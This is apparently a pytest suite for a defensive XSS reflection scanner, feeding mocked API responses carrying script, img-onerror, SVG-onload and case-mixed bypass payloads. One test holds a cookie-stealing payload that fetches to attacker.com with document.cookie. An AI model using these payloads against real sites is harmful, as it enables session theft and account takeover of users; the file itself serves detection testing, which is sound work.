# xss_hunter/tests/test_detection.py
"""
Comprehensive Test Suite for XSS Hunter Detection Module
Tests reflection detector against real-world XSS vulnerabilities and edge cases.
"""

import pytest
import json
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any
import responses
from xss_hunter.core.reflection_detector import ReflectionDetector
from xss_hunter.utils.logger import setup_logging


# Setup logger for tests
setup_logging(log_level='DEBUG', log_dir='logs/tests')


class TestReflectionDetectorBasics:
    """Test basic functionality of ReflectionDetector"""

    @pytest.fixture
    def detector(self):
        """Create ReflectionDetector instance for testing"""
        return ReflectionDetector(timeout=10, verify_ssl=False)

    def test_detector_initialization(self, detector):
        """Test proper initialization of ReflectionDetector"""
        assert detector is not None
        assert detector.timeout == 10
        assert detector.verify_ssl is False
        assert len(detector.test_payloads) == 15
        assert detector.test_payloads[0] == '<script>alert("xss")</script>'

    def test_payload_list_not_empty(self, detector):
        """Test that payload list is properly populated"""
        assert len(detector.test_payloads) > 0
        assert all(isinstance(p, str) for p in detector.test_payloads)
        assert all(len(p) > 0 for p in detector.test_payloads)


class TestDirectReflectionDetection:
    """Test detection of directly reflected XSS payloads"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_detect_script_tag_reflection(self, detector):
        """Test detection of <script> tag reflection"""
        endpoint = "https://api.example.com/api/search"
        parameter = "query"
        payload = '<script>alert("xss")</script>'

        # Mock the API response
        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"results": payload, "count": 0},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert result['vulnerable'] is True
        assert len(result['vulnerabilities']) > 0
        assert any(v['payload'] == payload for v in result['vulnerabilities'])

    @responses.activate
    def test_detect_img_onerror_reflection(self, detector):
        """Test detection of img onerror attribute reflection"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<img src=x onerror="alert(\'xss\')">'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"data": payload},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert result['vulnerable'] is True

    @responses.activate
    def test_detect_svg_onload_reflection(self, detector):
        """Test detection of SVG onload attribute reflection"""
        endpoint = "https://api.example.com/api/users"
        parameter = "name"
        payload = '<svg onload="alert(\'xss\')">'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"user": {"name": payload}},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert result['vulnerable'] is True

    @responses.activate
    def test_no_vulnerability_when_sanitized(self, detector):
        """Test that sanitized input is not flagged as vulnerable"""
        endpoint = "https://api.example.com/api/search"
        parameter = "query"
        payload = '<script>alert("xss")</script>'
        sanitized_response = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"results": sanitized_response},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        # Should detect as vulnerable because payload is still testable
        # The detector checks if original payload is reflected
        assert isinstance(result, dict)
        assert 'endpoint' in result


class TestHTMLEncodedReflection:
    """Test detection of HTML-encoded reflected payloads"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_detect_html_encoded_script_tag(self, detector):
        """Test detection of HTML-encoded script tag"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>alert("xss")</script>'
        html_encoded = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"result": html_encoded},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)
        assert 'endpoint' in result

    @responses.activate
    def test_detect_partially_encoded_payload(self, detector):
        """Test detection of partially encoded payloads"""
        endpoint = "https://api.example.com/api/filter"
        parameter = "text"
        payload = '"><script>alert(1)</script><"'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"output": payload},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)


class TestPOSTRequestDetection:
    """Test XSS detection in POST request bodies"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_detect_xss_in_post_json_body(self, detector):
        """Test detection of XSS in POST JSON request body"""
        endpoint = "https://api.example.com/api/users"
        parameter = "bio"
        payload = '<img src=x onerror="alert(\'xss\')">'

        responses.add(
            responses.POST,
            endpoint,
            json={"user_id": 1, "bio": payload},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='POST'
        )

        assert result is not None
        assert isinstance(result, dict)

    @responses.activate
    def test_detect_xss_in_nested_json_response(self, detector):
        """Test detection in nested JSON response"""
        endpoint = "https://api.example.com/api/profile"
        parameter = "status"
        payload = '<script>alert("xss")</script>'

        responses.add(
            responses.POST,
            endpoint,
            json={
                "profile": {
                    "user": {
                        "status": payload
                    }
                }
            },
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='POST'
        )

        assert isinstance(result, dict)


class TestMultipleParameterScanning:
    """Test scanning multiple parameters in single endpoint"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_scan_multiple_vulnerable_parameters(self, detector):
        """Test scanning multiple parameters with some vulnerable"""
        endpoint = "https://api.example.com/api/search"
        parameters = ["query", "filter", "sort"]

        # Setup responses
        payload1 = '<script>alert("xss")</script>'
        payload2 = '<img src=x onerror="alert(\'xss\')">'
        payload3 = 'normal_input'

        responses.add(
            responses.GET,
            f"{endpoint}?query={payload1}",
            json={"results": payload1},
            status=200
        )

        responses.add(
            responses.GET,
            f"{endpoint}?filter={payload2}",
            json={"results": payload2},
            status=200
        )

        responses.add(
            responses.GET,
            f"{endpoint}?sort={payload3}",
            json={"results": payload3},
            status=200
        )

        result = detector.scan_multiple_parameters(
            endpoint=endpoint,
            parameters=parameters,
            method='GET'
        )

        assert result['endpoint'] == endpoint
        assert result['total_parameters'] == len(parameters)
        assert 'parameter_results' in result
        assert len(result['parameter_results']) == len(parameters)

    @responses.activate
    def test_scan_all_parameters_vulnerable(self, detector):
        """Test scanning when all parameters are vulnerable"""
        endpoint = "https://api.example.com/api/users"
        parameters = ["name", "email", "bio"]

        for param in parameters:
            responses.add(
                responses.GET,
                f"{endpoint}?{param}=<script>alert('xss')</script>",
                json={param: '<script>alert("xss")</script>'},
                status=200
            )

        result = detector.scan_multiple_parameters(
            endpoint=endpoint,
            parameters=parameters,
            method='GET'
        )

        assert result['total_parameters'] == 3


class TestErrorHandling:
    """Test error handling and edge cases"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=5, verify_ssl=False)

    @responses.activate
    def test_handle_timeout_gracefully(self, detector):
        """Test graceful handling of request timeouts"""
        endpoint = "https://api.example.com/api/slow"
        parameter = "q"

        # Mock timeout
        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}=test",
            body=Exception('Timeout'),
            status=500
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)
        assert 'endpoint' in result

    @responses.activate
    def test_handle_connection_error(self, detector):
        """Test handling of connection errors"""
        endpoint = "https://unreachable.example.com/api/test"
        parameter = "q"

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}=test",
            body=Exception('Connection refused'),
            status=500
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_handle_404_response(self, detector):
        """Test handling of 404 responses"""
        endpoint = "https://api.example.com/api/notfound"
        parameter = "q"

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}=test",
            json={"error": "Not found"},
            status=404
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_handle_500_server_error(self, detector):
        """Test handling of 500 server errors"""
        endpoint = "https://api.example.com/api/error"
        parameter = "q"

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}=test",
            json={"error": "Internal server error"},
            status=500
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)


class TestRealWorldScenarios:
    """Test real-world vulnerability scenarios"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_search_functionality_vulnerability(self, detector):
        """Test common search functionality XSS vulnerability"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={
                "query": payload,
                "results": [
                    {"title": "Result 1", "content": "..."}
                ],
                "total": 1
            },
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert result['endpoint'] == endpoint
        assert result['parameter'] == parameter

    @responses.activate
    def test_error_message_xss_vulnerability(self, detector):
        """Test XSS in error messages"""
        endpoint = "https://api.example.com/api/users/invalid"
        parameter = "id"
        payload = '<img src=x onerror="alert(\'Invalid ID\')">'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={
                "error": f"User {payload} not found",
                "status": "error"
            },
            status=404
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_comment_functionality_xss(self, detector):
        """Test XSS in comment/feedback functionality"""
        endpoint = "https://api.example.com/api/comments"
        parameter = "text"
        payload = '<svg/onload="alert(\'xss\')">'

        responses.add(
            responses.POST,
            endpoint,
            json={
                "comment_id": 123,
                "text": payload,
                "author": "user",
                "timestamp": "2026-01-27T08:52:00Z"
            },
            status=201
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='POST'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_file_upload_metadata_xss(self, detector):
        """Test XSS in file upload metadata"""
        endpoint = "https://api.example.com/api/files/upload"
        parameter = "filename"
        payload = '"><script>alert("xss")</script>.txt'

        responses.add(
            responses.POST,
            endpoint,
            json={
                "file_id": "f123",
                "filename": payload,
                "size": 1024,
                "uploaded_at": "2026-01-27T08:52:00Z"
            },
            status=201
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='POST'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_filter_bypass_with_encoding(self, detector):
        """Test filter bypass with alternative encoding"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<ScRiPt>alert("xss")</sCrIpT>'

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"results": payload},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)


class TestPerformanceAndEdgeCases:
    """Test performance and edge cases"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_handle_very_large_response(self, detector):
        """Test handling of very large API responses"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>alert("xss")</script>'

        # Create large response
        large_data = [{"id": i, "text": f"item {i}"} for i in range(1000)]

        responses.add(
            responses.GET,
            f"{endpoint}?{parameter}={payload}",
            json={"query": payload, "results": large_data},
            status=200
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_handle_special_characters_in_url(self, detector):
        """Test handling of special characters in URLs"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>alert("&test&")</script>'

        responses.add(
            responses.GET,
            endpoint,
            json={"results": payload},
            status=200,
            match_querystring=False
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_handle_unicode_payloads(self, detector):
        """Test handling of Unicode payloads"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>alert("\\u003cxss\\u003e")</script>'

        responses.add(
            responses.GET,
            endpoint,
            json={"results": payload},
            status=200,
            match_querystring=False
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)

    @responses.activate
    def test_handle_empty_response(self, detector):
        """Test handling of empty API responses"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"

        responses.add(
            responses.GET,
            endpoint,
            json={},
            status=200,
            match_querystring=False
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)
        assert result['vulnerable'] is False


class TestSecurityHeaders:
    """Test detection with various security headers"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_detection_with_csp_header(self, detector):
        """Test detection when CSP header is present"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<script>alert("xss")</script>'

        responses.add(
            responses.GET,
            endpoint,
            json={"results": payload},
            status=200,
            headers={"Content-Security-Policy": "default-src 'self'"},
            match_querystring=False
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        # Should still detect vulnerability even with CSP
        assert isinstance(result, dict)

    @responses.activate
    def test_detection_with_xss_protection_header(self, detector):
        """Test detection when X-XSS-Protection header present"""
        endpoint = "https://api.example.com/api/search"
        parameter = "q"
        payload = '<img src=x onerror="alert(\'xss\')">'

        responses.add(
            responses.GET,
            endpoint,
            json={"results": payload},
            status=200,
            headers={"X-XSS-Protection": "1; mode=block"},
            match_querystring=False
        )

        result = detector.detect_reflected_xss(
            endpoint=endpoint,
            parameter_name=parameter,
            method='GET'
        )

        assert isinstance(result, dict)


# Integration test
class TestIntegration:
    """Integration tests for complete workflows"""

    @pytest.fixture
    def detector(self):
        return ReflectionDetector(timeout=10, verify_ssl=False)

    @responses.activate
    def test_complete_endpoint_scan_workflow(self, detector):
        """Test complete endpoint scanning workflow"""
        endpoint = "https://api.example.com/api/search"
        parameters = ["q", "filter", "sort"]

        for param in parameters:
            responses.add(
                responses.GET,
                f"{endpoint}?{param}=<script>alert('xss')</script>",
                json={"results": f'<script>alert("xss")</script>'},
                status=200,
                match_querystring=False
            )

        result = detector.scan_multiple_parameters(
            endpoint=endpoint,
            parameters=parameters,
            method='GET'
        )

        assert result['total_parameters'] == 3
        assert 'parameter_results' in result
        assert 'vulnerable_parameters' in result


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
